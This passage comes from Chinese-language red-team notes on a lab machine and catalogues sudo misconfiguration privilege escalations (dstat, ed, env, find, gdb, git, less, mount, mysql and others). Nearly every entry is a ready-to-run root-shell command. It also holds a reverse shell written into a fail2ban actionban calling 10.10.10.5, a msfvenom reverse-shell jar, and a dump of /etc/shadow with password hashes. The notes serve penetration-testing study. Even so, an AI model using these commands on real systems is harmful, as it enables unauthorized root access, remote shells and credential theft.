    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/dstat
```

发现可以无需密码执行 `/usr/bin/dstat` 命令，找到插件目录，按照格式攥写利用功能的插件。

```bash
jackie@RedteamNotes:~$ find / -name dstat -type d 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
jackie@RedteamNotes:~$ ls /usr/share/dstat
dstat_battery.py         dstat_jvm_full.py             dstat_nfsstat4.py       dstat_top_cpu.py
dstat_battery_remain.py  dstat_jvm_vm.py               dstat_ntp.py            dstat_top_cputime_avg.py
dstat_condor_queue.py    dstat_lustre.py               dstat_postfix.py        dstat_top_cputime.py
dstat_cpufreq.py         dstat_md_status.py            dstat_power.py          dstat_top_int.py
dstat_dbus.py            dstat_memcache_hits.py        dstat_proc_count.py     dstat_top_io_adv.py
dstat_disk_avgqu.py      dstat_mongodb_conn.py         dstat.py                dstat_top_io.py
dstat_disk_avgrq.py      dstat_mongodb_mem.py          dstat_qmail.py          dstat_top_latency_avg.py
dstat_disk_svctm.py      dstat_mongodb_opcount.py      dstat_redis.py          dstat_top_latency.py
dstat_disk_tps.py        dstat_mongodb_queue.py        dstat_rpcd.py           dstat_top_mem.py
dstat_disk_util.py       dstat_mongodb_stats.py        dstat_rpc.py            dstat_top_oom.py
dstat_disk_wait.py       dstat_mysql5_cmds.py          dstat_sendmail.py       dstat_utmp.py
dstat_dstat_cpu.py       dstat_mysql5_conn.py          dstat_snmp_cpu.py       dstat_vm_cpu.py
dstat_dstat_ctxt.py      dstat_mysql5_innodb_basic.py  dstat_snmp_load.py      dstat_vmk_hba.py
dstat_dstat_mem.py       dstat_mysql5_innodb_extra.py  dstat_snmp_mem.py       dstat_vmk_int.py
dstat_dstat.py           dstat_mysql5_innodb.py        dstat_snmp_net_err.py   dstat_vmk_nic.py
dstat_fan.py             dstat_mysql5_io.py            dstat_snmp_net.py       dstat_vm_mem_adv.py
dstat_freespace.py       dstat_mysql5_keys.py          dstat_snmp_sys.py       dstat_vm_mem.py
dstat_fuse.py            dstat_mysql_io.py             dstat_snooze.py         dstat_vz_cpu.py
dstat_gpfs_ops.py        dstat_mysql_keys.py           dstat_squid.py          dstat_vz_io.py
dstat_gpfs.py            dstat_net_packets.py          dstat_test.py           dstat_vz_ubc.py
dstat_helloworld.py      dstat_nfs3_ops.py             dstat_thermal.py        dstat_wifi.py
dstat_ib.py              dstat_nfs3.py                 dstat_top_bio_adv.py    dstat_zfs_arc.py
dstat_innodb_buffer.py   dstat_nfsd3_ops.py            dstat_top_bio.py        dstat_zfs_l2arc.py
dstat_innodb_io.py       dstat_nfsd3.py                dstat_top_childwait.py  dstat_zfs_zil.py
dstat_innodb_ops.py      dstat_nfsd4_ops.py            dstat_top_cpu_adv.py    __pycache__
```

攥写恶意脚本并利用。

```bash
jackie@RedteamNotes:~$ vim dstat_exploit.py
jackie@RedteamNotes:~$ cat dstat_exploit.py 
import os; os.execv("/bin/bash", ["bash"])
jackie@RedteamNotes:~$ mv dstat_exploit.py /usr/share/dstat/dstat_exploit.py
jackie@RedteamNotes:~$ ls -liah /usr/share/dstat/dstat_exploit.py 
524657 -rw-rw-r-- 1 jackie jackie 43 Jan 17 14:52 /usr/share/dstat/dstat_exploit.py
jackie@RedteamNotes:~$ sudo dstat --exploit
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib and slated for removal in Python 3.12; see the module's documentation for alternative uses
  import imp
root@RedteamNotes:/home/jackie# whoami
root
```

`dstat` 是一个用于系统监控和诊断的工具，它提供了实时的性能统计数据和系统资源使用情况。通过使用 `dstat` 命令可以获得有关 CPU、内存、磁盘、网络等方面的详细信息。

### sudo ed

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/ed
```

发现可以无需密码执行 `/usr/bin/ed` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo ed
!/bin/bash
root@RedteamNotes:/home/jackie# whoami
root
```

`ed` 是一个编辑器，一个基于行的文本编辑器，它被设计成在终端中进行操作，并且没有图形用户界面。

`!/bin/bash` 是在 `ed` 编辑器中输入的命令。这个命令告诉 `ed` 执行一个外部的 `shell` 脚本。

### sudo env

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/env
```

发现可以无需密码执行 `/usr/bin/env` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo env /bin/bash
root@RedteamNotes:/home/jackie# whoami
root
```

`env` 通常用于设置和显示环境变量的值。在本利用中，`env` 命令用于在指定环境下执行后面的命令。

### sudo expect

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/expect
```

发现可以无需密码执行 `/usr/bin/expect` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo expect -c 'spawn /bin/bash;interact'
spawn /bin/bash
root@RedteamNotes:/home/jackie# whoami
root
```

`expect` 能模拟用户的键盘输入，恶意命令以 `root` 身份在新的 `shell` 进程中开启了一个交互式会话。`-c` 允许在命令行中输入 `expect` 脚本代码，而不是从文件中读取。

### sudo fail2ban

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/fail2ban
```

发现可以无需密码执行 `/usr/bin/fail2ban` 命令，查找 `fail2ban` 的配置文件。

```bash
jackie@RedteamNotes:~$ find / -name fail2ban -type d 2>/dev/null
/usr/share/doc/fail2ban
/usr/lib/python3/dist-packages/fail2ban
/run/fail2ban
/var/lib/fail2ban
/etc/fail2ban
```

进一步查找可写文件。

```bash
jackie@RedteamNotes:~$ find /etc -writable -type d 2>/dev/null
/etc/fail2ban/action.d
jackie@RedteamNotes:~$ ls -liah /etc/fail2ban
total 72K
394975 drwxr-xr-x   6 root root   4.0K May 22  2023 .
393218 drwxr-xr-x 117 root root   4.0K May 24  2023 ..
394976 drwxrwx---   2 root jackie 4.0K May 22  2023 action.d
395040 -rw-r--r--   1 root root   2.8K Nov 23  2020 fail2ban.conf
395041 drwxr-xr-x   2 root root   4.0K Mar 10  2022 fail2ban.d
395042 drwxr-xr-x   3 root root   4.0K May 17  2023 filter.d
442894 -rw-r--r--   1 root root    25K May 22  2023 jail.conf
395137 drwxr-xr-x   2 root root   4.0K May 17  2023 jail.d
395139 -rw-r--r--   1 root root    645 Nov 23  2020 paths-arch.conf
395140 -rw-r--r--   1 root root   2.8K Nov 23  2020 paths-common.conf
395141 -rw-r--r--   1 root root    650 Mar 10  2022 paths-debian.conf
395142 -rw-r--r--   1 root root    738 Nov 23  2020 paths-opensuse.conf
```

`fail2ban` 的规则文件夹可写，通过下面办法使其可以编辑

```bash
ackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
394582 -rw-r--r-- 1 root root 1.5K May 22  2023 iptables-multiport.conf
jackie@RedteamNotes:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak
mv: replace 'iptables-multiport.conf.bak', overriding mode 0644 (rw-r--r--)? 
jackie@RedteamNotes:/etc/fail2ban/action.d$ 
jackie@RedteamNotes:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
jackie@RedteamNotes:/etc/fail2ban/action.d$ 
jackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
394582 -rw-r--r-- 1 jackie jackie 1.5K Jan 17 15:43 iptables-multiport.conf
jackie@RedteamNotes:/etc/fail2ban/action.d$ chmod 666 iptables-multiport.conf
jackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
394582 -rw-rw-rw- 1 jackie jackie 1.5K Jan 17 15:43 iptables-multiport.conf
```

`mv` 移动文件所有者不变仍为 `root`，`cp` 复制文件，新文件所有者变为 `jackie`。编辑文件放入 反弹 `shell`。

```bash
jackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
394582 -rw-rw-rw- 1 jackie jackie 1.5K Jan 17 15:43 iptables-multiport.conf
jackie@RedteamNotes:/etc/fail2ban/action.d$ vim iptables-multiport.conf
jackie@RedteamNotes:/etc/fail2ban/action.d$ cat iptables-multiport.conf | grep 'actionban'
# Notes.:  command executed once before each actionban command
# Option:  actionban
# actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.5 9595 >/tmp/f
```

使用 `sudo` 权限重启 `fail2ban`。

```bash
jackie@RedteamNotes:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
Restarting fail2ban (via systemctl): fail2ban.service.
```

在 `kali` 中建立监听，然后快速使用空密码登入 `jackie`。

![](Pasted%20image%2020260118180538.png)

### sudo find

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/find
```

发现可以无需密码执行 `/usr/bin/find` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo find . -exec /bin/bash \; -quit
root@RedteamNotes:/home/jackie# whoami
root
```

解释一下命令。

```sh
sudo find . -exec /bin/bash \; -quit
```
 
这个命令不是查找逻辑，`/bin/bash` 不会对找到的文件或目录进行任何处理，而 `-quit` 又会在找到第一个文件或目录后就使 `find` 命令停止。这个命令的使命就是新起一个 `shell`。

`\;` 则是 `-exec` 参数的结束符，告诉 `find` 命令 `-exec` 参数的内容到此为止。需要注意的是 `-exec` 命令后面的 `\;` 必须被转义（即加上 `\`），否则 `shell` 会将 `;` 解释为命令分隔符，导致 `-exec` 参数没有正确的结束，从而引发错误。因此我们需要携程 `\;`，而不是单独的 `;`。

### sudo flock

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/flock
```

发现可以无需密码执行 `/usr/bin/flock` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo flock -u / /bin/bash
root@RedteamNotes:/home/jackie# whoami
root
root
```

`flock` 是一个在 Linux 中管理文件锁定的实用程序。它可以用来协调多个进程对文件或文件系统的访问，避免这些进程同时访问同一资源导致的问题。`-u` 是 `flock` 的选项，表示解锁，这个命令的含义就是以管理员权限来解锁对根目录的锁定，以 `bash shell` 来执行这个操作。

### sudo ftp

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/ftp
```

发现可以无需密码执行 `/usr/bin/ftp` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo ftp
ftp> !/bin/bash
root@RedteamNotes:/home/jackie# whoami
root
```

`!` 在这里是一个特殊字符，表示要暂时离开 `FTP` 会话并在本地 `shell` 中执行命令。`!` 的这个用法在 `vi`、`ed` 等编辑器下也存在，可以总结为一种通用做法。

### sudo gcc

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/gcc
```

发现可以无需密码执行 `/usr/bin/gcc` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo gcc -wrapper /bin/bash,-s .
root@RedteamNotes:/home/jackie# whoami
root
```

- `-wrapper` 是 `gcc` 的一个选项，它允许在 `gcc` 调用实际编译器或链接器之前，先调用一个包装器（wrapper）脚本或程序。
- `,-s` 是一个 `bash` 带的一个选项，它使得 `bash` 在读取到 `EOF` 时不会退出。
- 最后的 `.` 时编译的源码，给任意源码均可，如果不想编译任何东西可以打包当前目录，即 `.`。

### sudo gdb

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/gdb
```

发现可以无需密码执行 `/usr/bin/gdb` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo gdb -nx -ex '!/bin/bash' -ex quit
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
root@RedteamNotes:/home/jackie# whoami
root
```

1. `-nx`：no execute 这个选项告诉 `gdb` 在启动时不读取任何 `.gdbinit` 文件，`.gdbinit` 文件时一个配置文件，`gdb` 在启动时会读取这个文件中的命令。
2. `-ex`：execute 这选项允许在 `gdb` 启动时执行一段 `gdb` 命令。
3. `!bash`：在 `gdb` 中，`!` 用来执行 `shell` 命令，因此 `!bash` 时在 `gdb` 中启动一个 `bash shell` 。
4. `-ex quit`：在执行完前面的命令后退出。


### sudo git

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/git
```

发现可以无需密码执行 `/usr/bin/git` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo git branch --help
!/bin/bash
root@RedteamNotes:/home/jackie# whoami
root
```

`branch` 是 `git` 的一个子命令，用于处理代码库中的分支。可以使用 `git branch` 创建、列出、删除分支。

### sudo gzip/gunzip

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/gunzip
    (root) NOPASSWD: /usr/bin/gzip
```

发现可以无需密码执行 `/usr/bin/gzip` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo gzip -c /etc/shadow | gzip -d
root:$6$1mokVIOR1y0hKn2n$.ImQujW12YEC4sMF7IQcUQmLStAQHuByyNhVIiEzvF/SQx3nBMPBFi4xQ40sp80V6ivaJEAy/0n23TsTi.AnO.:19495:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
messagebus:*:19405:0:99999:7:::
systemd-timesync:*:19405:0:99999:7:::
pollinate:*:19405:0:99999:7:::
sshd:*:19405:0:99999:7:::
syslog:*:19405:0:99999:7:::
uuidd:*:19405:0:99999:7:::
tcpdump:*:19405:0:99999:7:::
tss:*:19405:0:99999:7:::
landscape:*:19405:0:99999:7:::
fwupd-refresh:*:19405:0:99999:7:::
usbmux:*:19467:0:99999:7:::
jack:$6$AQNi8FXirbH0UTEj$qFvuV86Nt0rLBUIIzD7lNwBsXAs0Pe.RkeGCdL6WAx7F/dnpMNlWnbtaxrGWLnFriYIssY2APvQoSuaPvHEkc.:19467:0:99999:7:::
lxd:!:19467::::::
jackie:$y$j9T$HGogdG4n7G1yXJqpQGvoS/$In6/ABIDki2EGI5fEDDVdWNaVBpoBqWE.mpRK45htg1:19495:0:99999:7:::
mysql:!:19494:0:99999:7:::
```

后续可参考可读 shadow 文件提权。

### sudo hping3

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/hping3
```

发现可以无需密码执行 `/usr/bin/hping3` 命令，执行提权命令。

```bash
jackie@RedteamNotes:~$ sudo hping3
hping3> /bin/bash
root@RedteamNotes:/home/jackie# whoami
root
```

`Hping3` 是一个强大的网络工具，用于分析和测试网络，生成各种类型的 `ICMP`、`IP`、`TCP`、`UDP` 和 `RAW-IP` 协议数据包，在交互式命令行启动新的 `bash` 会话。

### sudo iftop

查看无需密码即可以 sudo 身份执行的命令。

```bash
user@RedteamNotes:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/rvim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
    (root) NOPASSWD: /usr/sbin/tcpdump
    (root) NOPASSWD: /usr/bin/exiftool
    (ALL, !root) NOPASSWD: /bin/bash
```

发现可以无需密码执行 `/usr/bin/iftop` 命令，执行提权命令。

```bash
user@RedteamNotes:~$ sudo iftop
interface: eth0
IP address is: 10.10.10.12
MAC address is: 00:0c:29:72:4e:62

!/bin/bash

root@RedteamNotes:/home/user# whoami
root
```

### sudo java

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/java
```

发现可以无需密码执行 `/usr/bin/java` 命令，在 `kali` 中使用 `msfvenom` 制作一个反弹 `shell`。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo msfvenom -p java/shell_reverse_tcp LHOTST=10.10.10.5 LPORT=4444 -f jar -o shell.jar
[sudo] password for kali: 
Payload size: 7497 bytes
Final size of jar file: 7497 bytes
Saved as: shell.jar
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls -liah shell.jar 
2767701 -rw-r--r-- 1 root root 7.4K Jan 19 01:21 shell.jar
```

传入靶机后使用 `sudo` 权限运行，同时在 `kali` 中建立监听。

![](Pasted%20image%2020260119142451.png)

碰到这种大型的语言或工具，其他的如 `perl`、`ruby`、`awk`，一定是有方法的，对于 `java` 这是标准的第一要能想到的办法。

### sudo less

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/less
```

发现可以无需密码执行 `/usr/bin/less` 命令，执行提权代码。

```bash
jackie@RedteamNotes:~$ sudo less /etc/hosts

!/bin/bash

root@RedteamNotes:/home/jackie# whoami
root
```

可以建立任意临时文件，在 `less` 中按 `!` 进入命令模式，`/bin/bash` 启动新的 `shell` 会话。

### sudo mount

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/mount
```

发现可以无需密码执行 `/usr/bin/mount` 命令，执行提权代码。

```bash
jackie@RedteamNotes:~$ sudo mount -o bind /bin/bash /bin/mount
jackie@RedteamNotes:~$ sudo /bin/mount
root@RedteamNotes:/home/jackie# whoami
root
```

这段代码使用 `sudo mount` 进行挂载，将 `/bin/bash` 挂载到 `/bin/mount` 下。

### sudo mysql

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/mysql
```

发现可以无需密码执行 `/usr/bin/mysql` 命令，执行提权代码。

```bash
jackie@RedteamNotes:~$ sudo mysql -e '\! /bin/bash'
root@RedteamNotes:/home/jackie# whoami
root
```

`-e` 是 `mysql` 的一个参数，execute 一些命令后退出，`-e` 允许直接在命令行中输入命令，而不需要打开一个 `mysql` 互动式会话。

`\! /bin/bash` 并不是一条 `SQL` 命令，而是 `mysql` 的一个特殊命令。当在 `mysql` 命令提示符后输入 `!` 时，可以运行一个系统 `shell` 命令。

### sudo nano

查看无需密码即可以 sudo 身份执行的命令。

```bash
jackie@RedteamNotes:~$ sudo -l                    
Matching Defaults entries for jackie on localhost:
    env_reset, mail_badpass,      
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
                                                    
User jackie may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/mysql
```

发现可以无需密码执行 `/usr/bin/nano` 命令，执行提权代码。

使用 `sudo nano` 启动 `nano` 后 `ctrl+r`，然后 `ctrl+x` 获得命令执行命令行，然后输入 `reset; bash 1>&0 2>&0` 重置 `shell`，启动 `bash`，输出和错误输入重定向，获得提权后的 `shell`。

![](Pasted%20image%2020260119144813.png)

- 0：标准输入，默认情况下与键盘输入相关联，接收用户从终端输入的数据。
- 1：标准输出，默认情况下与终端输出相关联，将程序输出的信息显示在终端上。
- 2：标准错误，默认情况下与终端输出相关联，用于显示程序的错误信息或警告。

- 3：第一个额外描述符。
- 4：第二个额外描述符。
- ......
- 10：第八个额外描述符。